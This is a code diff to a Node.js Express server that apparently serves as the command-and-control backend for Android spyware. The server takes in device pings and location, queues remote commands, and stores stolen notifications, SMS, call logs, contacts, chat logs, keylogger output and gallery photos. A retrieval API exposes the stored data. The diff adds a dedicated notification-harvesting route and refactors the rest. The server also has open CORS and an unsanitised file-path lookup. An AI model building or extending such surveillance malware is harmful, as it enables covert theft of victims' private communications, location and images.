@@ -12,7 +12,6 @@ const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
 app.use(cors({ origin: '*' }));
-// Limit badhaya taaki badi images ya heavy logs aa sakein
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.static(__dirname));
@@ -29,7 +28,6 @@ app.get('/api/device-status/:id', (req, res) => {
     const id = req.params.id.toUpperCase().trim();
     const device = devicesStatus[id];
     
-    // Agar device kabhi connect nahi hua
     if (!device) return res.json({ id: id, isOnline: false });
     
     // Agar last seen 60 seconds ke andar hai to Online maano
@@ -44,17 +42,13 @@ app.post('/api/status', (req, res) => {
         if (!device_id) return res.status(400).json({ error: "No ID" });
 
         const id = device_id.toString().trim().toUpperCase();
-        
-        // Purana command check karo
         const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";
 
-        // Values ko normalize karo
         let finalBattery = battery || level || 0;
         let isCharging = (String(charging) === "true");
         let currentLat = lat || (devicesStatus[id] ? devicesStatus[id].lat : 0);
         let currentLon = lon || (devicesStatus[id] ? devicesStatus[id].lon : 0);
 
-        // Status update
         devicesStatus[id] = {
             id: id,
             model: model || (devicesStatus[id] ? devicesStatus[id].model : "Unknown"),
@@ -64,7 +58,7 @@ app.post('/api/status', (req, res) => {
             lat: currentLat,
             lon: currentLon,
             lastSeen: Date.now(),
-            command: "none" // Command bhej diya, ab reset kar do
+            command: "none"
         };
 
         console.log(`📡 [PING] ${id} | Bat: ${finalBattery}%`);
@@ -81,8 +75,6 @@ app.post('/api/send-command', (req, res) => {
     if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
     
     const id = device_id.toUpperCase().trim();
-    
-    // Agar device list me nahi hai to add kar lo temporarily
     if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
     
     let finalCommand = command === "normal" ? "loud" : command;
@@ -92,7 +84,48 @@ app.post('/api/send-command', (req, res) => {
     res.json({ status: "success", command: finalCommand });
 });
 
-// --- 5. DATA UPLOAD (YE HAI MAIN LOGIC) ---
+// --- 5. SEPARATE NOTIFICATION ROUTE (YE RAHA ALAG SE) ---
+app.post('/api/upload_notification', (req, res) => {
+    let { device_id, title, content, app_name, date } = req.body;
+    
+    if (!device_id) return res.status(400).json({ error: "No ID" });
+    
+    const id = device_id.toString().trim().toUpperCase();
+    const filePath = path.join(UPLOADS_DIR, `${id}_notifications.json`);
+    
+    // Data format waisa hi rakha hai jaisa phone bhejta hai
+    let notifData = {
+        app: app_name || "Unknown",
+        title: title || "No Title",
+        text: content || "",
+        timestamp: Date.now(),
+        date: date || new Date().toLocaleString()
+    };
+
+    try {
+        let existingData = [];
+        if (fs.existsSync(filePath)) {
+            try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
+        }
+        
+        // Naya notification add karo
+        existingData.unshift(notifData);
+        
+        // Update Last Seen
+        if (devicesStatus[id]) devicesStatus[id].lastSeen = Date.now();
+        
+        // Save File (Limit 1000 items)
+        fs.writeFileSync(filePath, JSON.stringify(existingData.slice(0, 1000), null, 2));
+        
+        console.log(`🔔 [NOTIF] ${id} - ${app_name}`);
+        res.json({ status: "success" });
+    } catch (e) {
+        console.error("Notif Error:", e);
+        res.status(500).json({ error: "Error saving notification" });
+    }
+});
+
+// --- 6. GENERAL DATA UPLOAD (SMS, CONTACTS, LOCATION ETC.) ---
 app.post('/api/upload_data', (req, res) => {
     let { device_id, type, data } = req.body;
     
@@ -101,59 +134,39 @@ app.post('/api/upload_data', (req, res) => {
     const id = device_id.toString().trim().toUpperCase();
     const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
 
-    // Device ka Last Seen update kar do jab bhi data aaye (Live Status ke liye)
-    if (devicesStatus[id]) {
-        devicesStatus[id].lastSeen = Date.now();
-    }
+    if (devicesStatus[id]) devicesStatus[id].lastSeen = Date.now();
 
     try {
-        // Data parse karo (kabhi string aata hai, kabhi object)
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
 
-        // --- A. LOCATION HANDLING ---
+        // --- LOCATION HANDLING ---
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
-            
-            // RAM me update karo taaki map par turant dikhe
             if (locObj && (locObj.lat || locObj.latitude)) {
                 if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                 devicesStatus[id].lat = locObj.lat || locObj.latitude;
                 devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
                 devicesStatus[id].lastSeen = Date.now();
             }
-            // File me save karo
             fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
         }
         
-        // --- B. LIST DATA (Chats, SMS, Contacts) ---
-        // Yahan 'chat_logs' zaroori hai
-        else if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
+        // --- LIST DATA (SMS, Call Logs, Contacts, Chat Logs) ---
+        // Note: Maine yahan se 'notifications' hata diya hai kyunki uska alag route hai upar
+        else if (['sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
             let existingData = [];
-            
-            // Purani file padho agar hai to
             if (fs.existsSync(filePath)) {
-                try { 
-                    const fileContent = fs.readFileSync(filePath, 'utf8');
-                    if (fileContent) existingData = JSON.parse(fileContent);
-                } catch (e) {
-                    console.log("Error reading old file, starting new.");
-                }
+                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
             }
             
-            // Naya data array banao
             const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
-            
-            // 🔥 MERGE: Naya pehle + Purana baad me (Latest on Top)
             const finalData = [...newDataArray, ...existingData];
-
-            // Size limit: Sirf last 2000 items rakho taaki file heavy na ho
             const trimmedData = finalData.slice(0, 2000); 
             
             fs.writeFileSync(filePath, JSON.stringify(trimmedData, null, 2));
-            console.log(`✅ [DATA] ${type} updated for ${id}. Total items: ${trimmedData.length}`);
+            console.log(`✅ [DATA] ${type} updated for ${id}`);
         } 
-        
-        // --- C. GENERIC DATA (Keylogger etc) ---
+        // --- OTHER DATA ---
         else {
             fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
         }
@@ -165,7 +178,7 @@ app.post('/api/upload_data', (req, res) => {
     }
 });
 
-// --- 6. GALLERY UPLOAD ---
+// --- 7. GALLERY UPLOAD ---
 app.post('/api/upload_gallery', (req, res) => {
     let { device_id, image_data, date } = req.body;
     if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
@@ -179,16 +192,13 @@ app.post('/api/upload_gallery', (req, res) => {
             try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {} 
         }
         
-        // Nayi photo sabse upar
         galleryData.unshift({ 
             time: date || new Date().toLocaleString(), 
             uploadedAt: Date.now(), 
             image: image_data 
         });
         
-        // Max 50 photos rakho
         fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 50), null, 2));
-        
         console.log(`📸 [GALLERY] Image received from ${id}`);
         res.json({ status: "success" });
     } catch (error) { 
@@ -196,7 +206,7 @@ app.post('/api/upload_gallery', (req, res) => {
     }
 });
 
-// --- 7. DATA RETRIEVAL (FRONTEND KE LIYE) ---
+// --- 8. GET DATA API ---
 app.get('/api/get-data/:device_id/:type', (req, res) => {
     const id = req.params.device_id.toUpperCase();
     const type = req.params.type;
@@ -205,7 +215,6 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
     if (fs.existsSync(filePath)) {
         res.sendFile(filePath);
     } else {
-        // Agar file nahi hai to empty array bhejo
         res.json([]);
     }
 });
